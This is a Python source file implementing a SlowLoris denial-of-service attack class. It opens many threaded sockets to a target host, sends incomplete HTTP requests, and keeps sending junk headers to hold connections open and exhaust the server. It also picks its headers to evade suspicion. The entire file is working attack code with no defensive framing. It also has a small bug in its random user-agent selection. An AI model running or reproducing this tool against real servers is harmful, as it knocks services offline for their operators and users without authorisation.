import socket
import ssl

from time import sleep
from random import randint
from multiprocessing.pool import ThreadPool
from . import logger


class SlowLoris:
    # User agents for random
    user_agents = [
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    ]

    # These are legit Firefox headers so the connections does not appear suspicious
    headers = [
        'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Accept-Language: en-US,en;q=0.5'
    ]

    def __init__(self, target, sock_count, thread_count=1, random_agent=False, ssl=False):
        '''
        A SlowLoris attack class which handles creation and management of sockets with thread pool feature
        Arguments:
        - `target` , a (host, port) set specifying the destination
        - `sock_count` , the number of socket connections to make to the target
        - `thread_count` , the maximum number of threads in the thread pool
        '''
        self.sockets = []
        self._workers = []

        # randomizing user agent
        if random_agent is True:
            logger.info('Selecting a random user agent...')
            self.headers[0] = 'User-Agent: {}'.format(self.user_agents[randint(0, len(user_agents))])

        logger.info('Attacking {} with {} sockets'.format(target[0], sock_count))
        self._sock_count = sock_count
        self.target = target

        logger.info('Creating a thread pool of {} threads'.format(thread_count))
        self.pool = ThreadPool(thread_count)

        # Logging headers for debugging purposes
        logger.debug('Using headers:')
        for header in self.headers:
            logger.debug(header)

        self.ssl = ssl

    def connect_sockets(self):
        '''
        Creates the socket connections specified in `_sock_count` by adding the task to the queue and blocks until all sockets are created
        '''
        logger.info('Creating {} sockets'.format(self._sock_count))
        for _ in range(self._sock_count):
            # Addding the task to the thread pool queue
            self.pool.apply_async(self.init_socket)
        self.pool.close()
        self.pool.join()
        logger.info('Created {} sockets'.format(len(self.sockets)))
        if len(self.sockets) != self._sock_count:
            raise Exception('Unable to create {} sockets!'.format(self._sock_count))

    def init_socket(self):
        '''
        Creates a single socket to the target and stores the socket in the `sockets` list to be managed later
        '''
        try:
            # Create and connect the socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect(self.target)

            # Wraps the socket for https
            if self.ssl is True:
                sock = ssl.wrap_socket(sock)
                logger.debug('Wrapped SSL')

            # Send the headers of the HTTP request
            sock.send('GET /?{} HTTP/1.1\r\n'.format(randint(0, 50000)).encode('utf-8'))
            for header in self.headers:
                sock.send('{}\r\n'.format(header).encode('utf-8'))

            # Note: a CLRF is not sent to maintain the connection
            logger.debug('Connection established for {} on port {}'.format(self.target[0], self.target[1]))
            if sock:
                # Appending the lists of sockets
                self.sockets.append(sock)
        except socket.error:
            # Unable to establish connection, return gracefully
            logger.debug('Losing connection at {} sockets'.format(len(self.sockets)))
            return

    def __enter__(self):
        '''
        To enable the `with ... as ...` construction of this class
        '''
        return self

    def __exit__(self, *args):
        '''
        Closing the socket connections for garbage collection
        '''
        for sock in self.sockets:
            sock.close()
        self.pool.terminate()

        logger.debug('Sockets closed successfully')

    def keep_alive(self):
        '''
        Slowly sending data to the server to maintain a connection and starve it's resources
        '''
        for sock in self.sockets:
            try:
                sock.send('X-a: {}\r\n'.format(randint(1, 50000)).encode('utf-8'))
            except socket.error:
                self.sockets.remove(sock)
        for _ in range(self._sock_count - len(self.sockets)):
            logger.debug('Recreating socket...')
            self.init_socket()
        sleep(15)
